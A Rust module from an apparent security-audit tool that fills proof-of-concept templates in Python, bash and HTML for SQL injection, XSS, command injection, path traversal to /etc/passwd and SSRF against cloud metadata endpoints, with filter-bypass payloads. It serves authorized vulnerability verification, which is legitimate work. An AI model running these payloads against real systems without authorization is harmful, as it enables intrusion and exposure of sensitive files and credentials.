// Copyright 2024 CTX-Audit
// SPDX-License-Identifier: Apache-2.0

//! PoC (Proof of Concept) 生成器
//!
//! 为已发现的漏洞生成安全的验证代码

use serde::{Deserialize, Serialize};
use std::collections::HashMap;

/// PoC 生成结果
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct PoCResult {
    /// PoC 唯一标识
    pub id: String,

    /// 漏洞类型
    pub vuln_type: String,

    /// 漏洞 ID
    pub vuln_id: String,

    /// PoC 代码
    pub code: String,

    /// 编程语言
    pub language: String,

    /// 使用说明
    pub usage: String,

    /// 预期结果
    pub expected_result: String,

    /// 安全警告
    pub safety_warning: String,

    /// 运行环境要求
    pub requirements: Vec<String>,

    /// 置信度
    pub confidence: f32,
}

impl PoCResult {
    /// 创建新的 PoC 结果
    pub fn new(vuln_type: &str, vuln_id: &str, language: &str) -> Self {
        Self {
            id: uuid::Uuid::new_v4().to_string()[..8].to_string(),
            vuln_type: vuln_type.to_string(),
            vuln_id: vuln_id.to_string(),
            code: String::new(),
            language: language.to_string(),
            usage: String::new(),
            expected_result: String::new(),
            safety_warning: "请仅在授权的测试环境中运行此 PoC".to_string(),
            requirements: Vec::new(),
            confidence: 0.5,
        }
    }

    /// 设置代码
    pub fn with_code(mut self, code: &str) -> Self {
        self.code = code.to_string();
        self
    }

    /// 设置使用说明
    pub fn with_usage(mut self, usage: &str) -> Self {
        self.usage = usage.to_string();
        self
    }

    /// 设置预期结果
    pub fn with_expected_result(mut self, result: &str) -> Self {
        self.expected_result = result.to_string();
        self
    }

    /// 设置安全警告
    pub fn with_safety_warning(mut self, warning: &str) -> Self {
        self.safety_warning = warning.to_string();
        self
    }

    /// 添加环境要求
    pub fn add_requirement(mut self, req: &str) -> Self {
        self.requirements.push(req.to_string());
        self
    }

    /// 设置置信度
    pub fn with_confidence(mut self, confidence: f32) -> Self {
        self.confidence = confidence.clamp(0.0, 1.0);
        self
    }
}

/// PoC 模板
#[derive(Debug, Clone)]
pub struct PoCTemplate {
    /// 模板名称
    pub name: String,

    /// 漏洞类型
    pub vuln_type: String,

    /// 语言
    pub language: String,

    /// PoC 代码模板
    pub code_template: String,

    /// 使用说明
    pub usage: String,

    /// 预期结果
    pub expected_result: String,

    /// 安全警告
    pub safety_warning: String,

    /// 环境要求
    pub requirements: Vec<String>,
}

impl PoCTemplate {
    /// 创建新的 PoC 模板
    pub fn new(name: &str, vuln_type: &str, language: &str) -> Self {
        Self {
            name: name.to_string(),
            vuln_type: vuln_type.to_string(),
            language: language.to_string(),
            code_template: String::new(),
            usage: String::new(),
            expected_result: String::new(),
            safety_warning: "请仅在授权的测试环境中运行此 PoC".to_string(),
            requirements: Vec::new(),
        }
    }
}

/// PoC 模板库
pub struct PoCTemplateLibrary {
    /// 按漏洞类型索引的模板
    templates: HashMap<String, Vec<PoCTemplate>>,
}

impl PoCTemplateLibrary {
    /// 创建新的模板库
    pub fn new() -> Self {
        let mut library = Self {
            templates: HashMap::new(),
        };
        library.load_builtin_templates();
        library
    }

    /// 加载内置模板
    fn load_builtin_templates(&mut self) {
        self.add_sql_injection_templates();
        self.add_xss_templates();
        self.add_command_injection_templates();
        self.add_path_traversal_templates();
        self.add_ssrf_templates();
    }

    /// SQL 注入 PoC 模板
    fn add_sql_injection_templates(&mut self) {
        // Python SQL 注入 PoC
        let python_sql = PoCTemplate {
            name: "Python SQL Injection PoC".to_string(),
            vuln_type: "SQL_INJECTION".to_string(),
            language: "python".to_string(),
            code_template: r#"#!/usr/bin/env python3
"""
SQL Injection Proof of Concept
漏洞 ID: {vuln_id}
目标: {target_url}
"""

import requests
import sys

def test_sql_injection():
    """测试 SQL 注入漏洞"""
    target = "{target_url}"
    payloads = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' UNION SELECT NULL--",
        "1' AND 1=1--",
        "1' AND 1=2--",
    ]

    results = []
    for payload in payloads:
        # 根据 {injection_point} 构造请求
        data = {param_name: payload}

        response = requests.post(target, data=data, timeout=10)

        # 检测注入成功的迹象
        if "error" in response.text.lower() or response.status_code != 200:
            results.append({
                "payload": payload,
                "status": response.status_code,
                "vulnerable": True
            })

    return results

if __name__ == "__main__":
    print("⚠️  警告: 此脚本仅用于授权的安全测试")
    print("=" * 50)

    results = test_sql_injection()
    for r in results:
        print(f"Payload: {r['payload']}")
        print(f"状态: {'存在漏洞' if r['vulnerable'] else '未检测到'}")
        print("-" * 30)
"#.to_string(),
            usage: "1. 修改 target_url 为目标地址\n2. 修改 param_name 为注入参数名\n3. 运行: python3 poc.py".to_string(),
            expected_result: "如果存在 SQL 注入漏洞，将显示 '存在漏洞' 并返回成功的 payload".to_string(),
            safety_warning: "⚠️  仅在授权的测试环境中使用。未经授权的测试可能违反法律。".to_string(),
            requirements: vec!["Python 3.6+".to_string(), "requests 库".to_string()],
        };
        self.add_template(python_sql);

        // curl SQL 注入 PoC
        let curl_sql = PoCTemplate {
            name: "cURL SQL Injection PoC".to_string(),
            vuln_type: "SQL_INJECTION".to_string(),
            language: "bash".to_string(),
            code_template: r#"#!/bin/bash
# SQL Injection Proof of Concept
# 漏洞 ID: {vuln_id}
# 目标: {target_url}

echo "⚠️  警告: 此脚本仅用于授权的安全测试"
echo "================================================"

TARGET="{target_url}"
PARAM="{param_name}"

# 基础注入测试
echo "[*] 测试基础注入..."
curl -s -X POST "$TARGET" \
  -d "$PARAM=' OR '1'='1" \
  | grep -i "error\|syntax\|mysql\|postgres\|oracle" && echo "[!] 可能存在 SQL 注入"

# UNION 注入测试
echo "[*] 测试 UNION 注入..."
curl -s -X POST "$TARGET" \
  -d "$PARAM=' UNION SELECT NULL--" \
  | grep -i "error\|the used select statements have different number of columns" && echo "[!] UNION 注入可能可行"

echo "[*] 测试完成"
"#.to_string(),
            usage: "1. 设置 TARGET 为目标 URL\n2. 设置 PARAM 为注入参数\n3. 运行: chmod +x poc.sh && ./poc.sh".to_string(),
            expected_result: "如果存在漏洞，将输出 '可能存在 SQL 注入' 或 'UNION 注入可能可行'".to_string(),
            safety_warning: "⚠️  仅在授权的测试环境中使用".to_string(),
            requirements: vec!["curl".to_string(), "bash".to_string()],
        };
        self.add_template(curl_sql);
    }

    /// XSS PoC 模板
    fn add_xss_templates(&mut self) {
        let html_xss = PoCTemplate {
            name: "HTML XSS PoC".to_string(),
            vuln_type: "XSS".to_string(),
            language: "html".to_string(),
            code_template: r#"<!DOCTYPE html>
<!--
XSS Proof of Concept
漏洞 ID: {vuln_id}
目标: {target_url}
-->
<html>
<head>
    <title>XSS PoC</title>
    <style>
        body { font-family: Arial, sans-serif; padding: 20px; }
        .warning { background: #fff3cd; padding: 10px; border-radius: 5px; }
        .payload { background: #f8f9fa; padding: 10px; margin: 10px 0; border-left: 3px solid #007bff; }
    </style>
</head>
<body>
    <div class="warning">
        ⚠️ 警告: 此页面仅用于授权的安全测试
    </div>

    <h1>XSS Payload 测试</h1>

    <h2>反射型 XSS Payloads</h2>
    <div class="payload">
        <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code>
        <p>测试: {target_url}?input=&lt;script&gt;alert('XSS')&lt;/script&gt;</p>
    </div>

    <div class="payload">
        <code>&lt;img src=x onerror=alert('XSS')&gt;</code>
        <p>测试: {target_url}?input=&lt;img src=x onerror=alert('XSS')&gt;</p>
    </div>

    <div class="payload">
        <code>&lt;svg onload=alert('XSS')&gt;</code>
        <p>测试: {target_url}?input=&lt;svg onload=alert('XSS')&gt;</p>
    </div>

    <h2>绕过过滤的 Payloads</h2>
    <div class="payload">
        <code>&lt;ScRiPt&gt;alert('XSS')&lt;/sCrIpT&gt;</code>
        <p>大小写混合绕过</p>
    </div>

    <div class="payload">
        <code>&lt;img src="javascript:alert('XSS')"&gt;</code>
        <p>JavaScript 协议</p>
    </div>

    <h2>预期结果</h2>
    <p>如果存在 XSS 漏洞，将弹出 alert 对话框显示 'XSS'</p>
</body>
</html>
"#.to_string(),
            usage: "1. 修改 target_url 为目标地址\n2. 在浏览器中打开此 HTML 文件\n3. 点击测试链接或手动复制 payload 到目标站点".to_string(),
            expected_result: "如果存在 XSS 漏洞，浏览器将执行 JavaScript 并弹出 alert 对话框".to_string(),
            safety_warning: "⚠️  仅在隔离的测试环境中使用。XSS 可能影响其他用户。".to_string(),
            requirements: vec!["现代浏览器".to_string()],
        };
        self.add_template(html_xss);
    }

    /// 命令注入 PoC 模板
    fn add_command_injection_templates(&mut self) {
        let python_cmd = PoCTemplate {
            name: "Python Command Injection PoC".to_string(),
            vuln_type: "COMMAND_INJECTION".to_string(),
            language: "python".to_string(),
            code_template: r#"#!/usr/bin/env python3
"""
Command Injection Proof of Concept
漏洞 ID: {vuln_id}
目标: {target_url}
"""

import requests
import time

def test_command_injection():
    """测试命令注入漏洞"""
    target = "{target_url}"

    # 时间盲注测试
    payloads = [
        "; sleep 5",
        "| sleep 5",
        "&& sleep 5",
        "`sleep 5`",
        "$(sleep 5)",
    ]

    results = []
    for payload in payloads:
        data = {param_name: payload}

        start = time.time()
        try:
            response = requests.post(target, data=data, timeout=15)
            elapsed = time.time() - start

            # 如果响应时间超过 5 秒，说明命令被执行
            if elapsed > 4.5:
                results.append({
                    "payload": payload,
                    "elapsed": elapsed,
                    "vulnerable": True
                })
                print(f"[!] 发现命令注入: {payload} (耗时: {elapsed:.2f}s)")
            else:
                print(f"[*] 测试: {payload} (耗时: {elapsed:.2f}s)")

        except requests.exceptions.Timeout:
            results.append({
                "payload": payload,
                "elapsed": 15,
                "vulnerable": True
            })
            print(f"[!] 发现命令注入 (超时): {payload}")

    return results

if __name__ == "__main__":
    print("⚠️  警告: 此脚本仅用于授权的安全测试")
    print("=" * 50)

    results = test_command_injection()
    print("\n[*] 测试完成")
    print(f"[*] 发现 {len(results)} 个可能存在漏洞的 payload")
"#.to_string(),
            usage: "1. 修改 target_url 和 param_name\n2. 运行: python3 poc.py".to_string(),
            expected_result: "如果存在命令注入漏洞，响应时间将超过 5 秒".to_string(),
            safety_warning: "⚠️  命令注入可能导致系统被完全控制。仅在授权的隔离环境中测试。".to_string(),
            requirements: vec!["Python 3.6+".to_string(), "requests 库".to_string()],
        };
        self.add_template(python_cmd);
    }

    /// 路径遍历 PoC 模板
    fn add_path_traversal_templates(&mut self) {
        let curl_path = PoCTemplate {
            name: "cURL Path Traversal PoC".to_string(),
            vuln_type: "PATH_TRAVERSAL".to_string(),
            language: "bash".to_string(),
            code_template: r#"#!/bin/bash
# Path Traversal Proof of Concept
# 漏洞 ID: {vuln_id}
# 目标: {target_url}

echo "⚠️  警告: 此脚本仅用于授权的安全测试"
echo "================================================"

TARGET="{target_url}"
PARAM="{param_name}"

# 常见路径遍历 payload
PAYLOADS=(
    "../../../etc/passwd"
    "....//....//....//etc/passwd"
    "..%2F..%2F..%2Fetc%2Fpasswd"
    "..\\..\\..\\windows\\win.ini"
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    "..%252f..%252f..%252fetc%252fpasswd"
)

echo "[*] 测试路径遍历漏洞..."

for payload in "${PAYLOADS[@]}"; do
    echo "[*] 测试: $payload"

    response=$(curl -s "$TARGET?$PARAM=$payload")

    # 检测成功的迹象
    if echo "$response" | grep -q "root:x:0:0"; then
        echo "[!] 发现路径遍历漏洞 (Linux)!"
        echo "    Payload: $payload"
    elif echo "$response" | grep -q "\[fonts\]"; then
        echo "[!] 发现路径遍历漏洞 (Windows)!"
        echo "    Payload: $payload"
    fi
done

echo "[*] 测试完成"
"#.to_string(),
            usage: "1. 设置 TARGET 和 PARAM\n2. 运行: chmod +x poc.sh && ./poc.sh".to_string(),
            expected_result: "如果存在路径遍历漏洞，将显示 /etc/passwd 或 win.ini 的内容".to_string(),
            safety_warning: "⚠️  路径遍历可能导致敏感文件泄露。仅在授权环境中测试。".to_string(),
            requirements: vec!["curl".to_string(), "bash".to_string()],
        };
        self.add_template(curl_path);
    }

    /// SSRF PoC 模板
    fn add_ssrf_templates(&mut self) {
        let python_ssrf = PoCTemplate {
            name: "Python SSRF PoC".to_string(),
            vuln_type: "SSRF".to_string(),
            language: "python".to_string(),
            code_template: r#"#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Proof of Concept
漏洞 ID: {vuln_id}
目标: {target_url}
"""

import requests
import socket

def test_ssrf():
    """测试 SSRF 漏洞"""
    target = "{target_url}"

    # SSRF 测试 payloads
    payloads = [
        # 内网探测
        ("http://127.0.0.1:80", "本地回环"),
        ("http://localhost:80", "本地回环"),
        ("http://192.168.1.1", "内网网关"),
        ("http://10.0.0.1", "内网 IP"),
        ("http://172.16.0.1", "内网 IP"),

        # 云元数据
        ("http://169.254.169.254/latest/meta-data/", "AWS 元数据"),
        ("http://metadata.google.internal/computeMetadata/v1/", "GCP 元数据"),
        ("http://169.254.169.254/metadata/v1/", "Azure 元数据"),

        # 绕过技巧
        ("http://0x7f000001", "十六进制绕过"),
        ("http://2130706433", "十进制绕过"),
        ("http://127.1", "简写绕过"),
    ]

    results = []
    for url, desc in payloads:
        data = {param_name: url}

        try:
            response = requests.post(target, data=data, timeout=10)

            # 检测成功的迹象
            if response.status_code == 200 and len(response.text) > 100:
                results.append({
                    "url": url,
                    "description": desc,
                    "response_length": len(response.text),
                    "vulnerable": True
                })
                print(f"[!] 可能存在 SSRF: {desc}")
                print(f"    URL: {url}")
                print(f"    响应长度: {len(response.text)}")
            else:
                print(f"[*] 测试 {desc}: 状态码 {response.status_code}")

        except Exception as e:
            print(f"[*] 测试 {desc}: 错误 - {str(e)}")

    return results

if __name__ == "__main__":
    print("⚠️  警告: 此脚本仅用于授权的安全测试")
    print("=" * 50)

    results = test_ssrf()
    print(f"\n[*] 发现 {len(results)} 个可能的 SSRF 入口")
"#.to_string(),
            usage: "1. 修改 target_url 和 param_name\n2. 运行: python3 poc.py".to_string(),
            expected_result: "如果存在 SSRF 漏洞，将能够访问内网资源或云元数据".to_string(),
            safety_warning: "⚠️  SSRF 可能导致内网扫描和敏感信息泄露。仅在授权环境中测试。".to_string(),
            requirements: vec!["Python 3.6+".to_string(), "requests 库".to_string()],
        };
        self.add_template(python_ssrf);
    }

    /// 添加模板
    pub fn add_template(&mut self, template: PoCTemplate) {
        self.templates
            .entry(template.vuln_type.clone())
            .or_insert_with(Vec::new)
            .push(template);
    }

    /// 获取漏洞类型的所有模板
    pub fn get_templates(&self, vuln_type: &str) -> Vec<&PoCTemplate> {
        self.templates
            .get(vuln_type)
            .map(|v| v.iter().collect())
            .unwrap_or_default()
    }

    /// 获取漏洞类型和语言匹配的模板
    pub fn get_templates_for_language(&self, vuln_type: &str, language: &str) -> Vec<&PoCTemplate> {
        self.templates
            .get(vuln_type)
            .map(|v| {
                v.iter()
                    .filter(|t| t.language == language)
                    .collect()
            })
            .unwrap_or_default()
    }
}

impl Default for PoCTemplateLibrary {
    fn default() -> Self {
        Self::new()
    }
}

/// PoC 生成器配置
#[derive(Debug, Clone)]
pub struct PoCGeneratorConfig {
    /// 是否包含安全警告
    pub include_safety_warnings: bool,

    /// 默认语言
    pub default_language: String,

    /// 是否生成详细说明
    pub verbose: bool,
}

impl Default for PoCGeneratorConfig {
    fn default() -> Self {
        Self {
            include_safety_warnings: true,
            default_language: "python".to_string(),
            verbose: true,
        }
    }
}

/// PoC 生成器
pub struct PoCGenerator {
    /// 模板库
    templates: PoCTemplateLibrary,

    /// 配置
    config: PoCGeneratorConfig,
}

impl PoCGenerator {
    /// 创建新的 PoC 生成器
    pub fn new() -> Self {
        Self {
            templates: PoCTemplateLibrary::new(),
            config: PoCGeneratorConfig::default(),
        }
    }

    /// 使用配置创建
    pub fn with_config(config: PoCGeneratorConfig) -> Self {
        Self {
            templates: PoCTemplateLibrary::new(),
            config,
        }
    }

    /// 生成 PoC
    pub fn generate(
        &self,
        vuln_type: &str,
        vuln_id: &str,
        context: &PoCContext,
    ) -> Option<PoCResult> {
        // 首先尝试匹配特定语言的模板
        let templates = self.templates.get_templates_for_language(vuln_type, &context.language);

        // 如果没有找到，使用默认语言
        let default_templates;
        let templates = if templates.is_empty() {
            default_templates = self.templates.get_templates_for_language(vuln_type, &self.config.default_language);
            &default_templates
        } else {
            &templates
        };

        // 如果还是没有，获取任意语言的
        let any_templates;
        let template = if !templates.is_empty() {
            templates.first()?
        } else {
            any_templates = self.templates.get_templates(vuln_type);
            any_templates.first()?
        };

        // 填充模板
        let code = self.fill_template(&template.code_template, context);

        let mut poc = PoCResult::new(vuln_type, vuln_id, &template.language);
        poc.code = code;
        poc.usage = template.usage.clone();
        poc.expected_result = template.expected_result.clone();
        poc.safety_warning = if self.config.include_safety_warnings {
            template.safety_warning.clone()
        } else {
            String::new()
        };
        poc.requirements = template.requirements.clone();
        poc.confidence = 0.7;

        Some(poc)
    }

    /// 填充模板变量
    fn fill_template(&self, template: &str, context: &PoCContext) -> String {
        let mut result = template.to_string();

        result = result.replace("{vuln_id}", &context.vuln_id);
        result = result.replace("{target_url}", &context.target_url);
        result = result.replace("{param_name}", &context.param_name);
        result = result.replace("{injection_point}", &context.injection_point);

        result
    }

    /// 获取支持的漏洞类型
    pub fn supported_vuln_types(&self) -> Vec<String> {
        self.templates.templates.keys().cloned().collect()
    }

    /// 获取模板库
    pub fn templates(&self) -> &PoCTemplateLibrary {
        &self.templates
    }
}

impl Default for PoCGenerator {
    fn default() -> Self {
        Self::new()
    }
}

/// PoC 上下文
#[derive(Debug, Clone, Default)]
pub struct PoCContext {
    /// 漏洞 ID
    pub vuln_id: String,

    /// 目标 URL
    pub target_url: String,

    /// 参数名
    pub param_name: String,

    /// 注入点
    pub injection_point: String,

    /// 语言
    pub language: String,

    /// 额外参数
    pub extra: HashMap<String, String>,
}

impl PoCContext {
    /// 创建新的上下文
    pub fn new() -> Self {
        Self {
            vuln_id: String::new(),
            target_url: "http://example.com/vulnerable".to_string(),
            param_name: "input".to_string(),
            injection_point: "query".to_string(),
            language: "python".to_string(),
            extra: HashMap::new(),
        }
    }

    /// 设置漏洞 ID
    pub fn with_vuln_id(mut self, id: &str) -> Self {
        self.vuln_id = id.to_string();
        self
    }

    /// 设置目标 URL
    pub fn with_target(mut self, url: &str) -> Self {
        self.target_url = url.to_string();
        self
    }

    /// 设置参数名
    pub fn with_param(mut self, name: &str) -> Self {
        self.param_name = name.to_string();
        self
    }

    /// 设置语言
    pub fn with_language(mut self, lang: &str) -> Self {
        self.language = lang.to_string();
        self
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_poc_result_creation() {
        let poc = PoCResult::new("SQL_INJECTION", "vuln-123", "python")
            .with_code("print('test')")
            .with_confidence(0.9);

        assert_eq!(poc.vuln_type, "SQL_INJECTION");
        assert_eq!(poc.confidence, 0.9);
    }

    #[test]
    fn test_poc_template_library() {
        let library = PoCTemplateLibrary::new();

        let templates = library.get_templates("SQL_INJECTION");
        assert!(!templates.is_empty());
    }

    #[test]
    fn test_poc_generator_sql_injection() {
        let generator = PoCGenerator::new();

        let context = PoCContext::new()
            .with_vuln_id("test-123")
            .with_target("http://test.com/api")
            .with_param("id")
            .with_language("python");

        let poc = generator.generate("SQL_INJECTION", "test-123", &context);

        assert!(poc.is_some());
        let poc = poc.unwrap();
        assert_eq!(poc.vuln_type, "SQL_INJECTION");
        assert!(poc.code.contains("test-123"));
        assert!(poc.code.contains("http://test.com/api"));
    }

    #[test]
    fn test_poc_generator_xss() {
        let generator = PoCGenerator::new();

        let context = PoCContext::new()
            .with_target("http://test.com/search")
            .with_language("html");

        let poc = generator.generate("XSS", "xss-1", &context);

        assert!(poc.is_some());
        let poc = poc.unwrap();
        // XSS template contains script tags (escaped in HTML for display)
        assert!(poc.code.contains("script") || poc.code.contains("XSS"));
    }

    #[test]
    fn test_poc_context() {
        let context = PoCContext::new()
            .with_vuln_id("vuln-1")
            .with_target("http://example.com")
            .with_param("query");

        assert_eq!(context.vuln_id, "vuln-1");
        assert_eq!(context.target_url, "http://example.com");
        assert_eq!(context.param_name, "query");
    }

    #[test]
    fn test_supported_vuln_types() {
        let generator = PoCGenerator::new();
        let types = generator.supported_vuln_types();

        assert!(types.contains(&"SQL_INJECTION".to_string()));
        assert!(types.contains(&"XSS".to_string()));
        assert!(types.contains(&"COMMAND_INJECTION".to_string()));
    }
}
